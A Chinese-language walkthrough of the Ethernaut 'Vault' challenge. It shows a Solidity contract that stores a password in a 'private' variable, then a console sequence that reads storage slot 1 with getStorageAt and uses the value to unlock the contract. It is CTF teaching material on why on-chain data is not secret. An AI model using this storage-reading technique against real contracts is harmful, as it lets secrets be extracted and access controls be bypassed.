# Ethernaut做题笔记(第九题)



## 1.题目要求

打开 vault 来通过这一关!



## 2.题目代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```



## 3.合约分析

两个知识点

- 合约部署时，其构造函数从 `initCode` 获取参数的方式
- 合约 storage 变量在状态树中的存储方式

两种思路

- 通过 EtherScan 查看合约部署时的 inputdata

- 通过 `getStorageAt` 向后端节点查询地址存储树



## 4.攻击流程

```
await contract.locked()
true

await contract.unlock(await web3.eth.getStorageAt(contract.address, 1))

await contract.locked()
false
```



![i6TbVb.png](https://i.328888.xyz/2023/04/19/i6TbVb.png)
